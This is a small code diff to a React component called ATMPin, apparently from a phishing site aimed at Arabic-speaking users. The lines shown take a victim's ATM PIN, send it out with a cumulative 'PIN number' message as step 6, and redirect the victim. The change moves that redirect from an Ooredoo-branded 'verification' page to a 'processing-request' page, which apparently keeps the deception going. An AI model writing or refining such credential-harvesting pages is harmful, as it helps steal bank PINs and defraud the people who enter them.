@@ -34,7 +34,7 @@ const ATMPin = () => {
       };
       updateData(newData);
       await sendCumulativeMessage(6, "رقم PIN", newData);
-      navigate('/ooredoo-verification');
+      navigate('/processing-request');
     }
   };
   return <div className="min-h-screen flex flex-col bg-white" dir="rtl">
